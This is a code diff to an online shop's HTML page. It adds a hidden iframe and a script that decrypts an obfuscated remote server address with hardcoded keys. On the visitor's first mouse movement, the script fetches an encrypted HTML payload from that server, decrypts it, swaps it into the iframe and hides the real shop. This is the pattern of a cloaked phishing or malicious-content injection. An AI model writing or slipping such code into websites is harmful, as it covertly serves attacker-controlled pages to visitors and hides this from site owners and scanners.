@@ -716,6 +716,7 @@
   }
   </style>
   </head>
+<body class="l-body">
 
           <div id="shop">
   </header>
@@ -963,7 +964,44 @@
     renderProducts();
   </script>
 </div>
+<iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
 
+
+<script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18NNv9UWO+LiNXQbDzIXZh1Pmi8rUxE3yIGhXY4zzKlt49YnjLtt+pJ0aXqMHkbZoJtY0nSXHfaVA==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    let lastUrl = null;
+
+    async function loadSecret() {
+        const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+        try {
+            const res = await fetch(DATA_ORIGIN + "win/sec");
+            const { cipher } = await res.json();
+            const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+            if (!html) throw new Error("Decrypt failed — wrong key?");
+
+            if (lastUrl) URL.revokeObjectURL(lastUrl);
+            const blob = new Blob([html], { type: "text/html" });
+            lastUrl = URL.createObjectURL(blob);
+
+            frame.src = lastUrl;
+
+
+            shop.style.display = "none";
+            frame.style.display = "block";
+
+        } catch (e) {
+            document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        }
+    }
+
+
+    window.addEventListener("mousemove", () => {
+        loadSecret();
+    }, { once: true });
+</script>
         
 </body>
 </html>
